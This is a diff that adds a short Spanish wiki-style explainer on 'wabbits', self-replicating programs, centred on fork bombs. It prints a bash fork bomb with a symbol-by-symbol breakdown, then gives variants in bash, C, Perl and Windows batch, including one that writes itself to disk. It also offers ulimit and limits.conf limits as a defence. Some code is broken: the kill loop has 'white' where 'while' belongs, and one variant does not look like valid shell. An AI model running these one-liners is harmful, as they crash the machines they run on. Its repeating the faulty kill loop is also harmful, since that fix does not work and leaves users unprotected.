@@ -1,0 +1,54 @@
+Según Wikipedia es la "correcta" forma de llamar a los programas que se reproducen a si mismos a gran velocidad, un ejemplo de esto son los fork bomb. El término viene desde Bugs Bunny, en la versión en inglés, Elmer Gruñon (Elmer Fudd) cuando se dispone a cazar a Bugs dice algo como...
+ Be vewwy, vewwy quiet. I'm hunting wabbits.
+Estos programas buscan reproducirse a gran velocidad, asi como los conejos.
+
+Defino una función que se llama a sí misma.
+ :(){ :|:& };:
+Explicación:
+ : () { : | : & } ; :
+ 0 1  2 3 4 5 6 7 8 9
+ 
+ 0 - nombre de la función
+ 1 - paréntesis declaran la función sin argumentos
+ 2 - inicio bloque
+ 3 - llamada recursiva a la propia función
+ 4 - abre una canalización a otro proceso
+ 5 - llamada recursiva a la propia función
+ 6 - fork, se divide y pone todo en segundo plano
+ 7 - fin bloque
+ 8 - finaliza declaración, separa comandos
+ 9 - ejecuta el código
+
+Produce un DOS local en toda máquina que no tenga limitado el número de forks de un proceso. Se define un límite de procesos por usuario en ''ulimit -u 1000'' o en /etc/security/limits.conf con
+ *      hard   nproc      4096
+Para pararlo, hacer
+ white true
+ do
+    killall -9 -u usuario bash
+ done
+Otro ejemplo:
+ : {(:|:|:)};:
+Una variante más letal es:
+ echo "\$0&\$0">_;chmod +x _;./_
+...ya que accede al disco.
+
+En C y Perl:
+ #include < unistd.h >
+ 
+ int main(void) {
+  while(1) {
+   fork();
+  }
+  return 0;
+ }
+
+ perl -e "fork while fork" &
+
+Para Win:
+ :s
+ start %0
+ goto s
+...crea múltiples cmd, entre 30 y 50 variando en número, pero es imposible matarles.
+
+*http://www.vicente-navarro.com/blog/index.php/2007/05/04/fork-bombs-ulimit-y-limitsconf
+*http://en.wikipedia.org/wiki/Fork_bomb
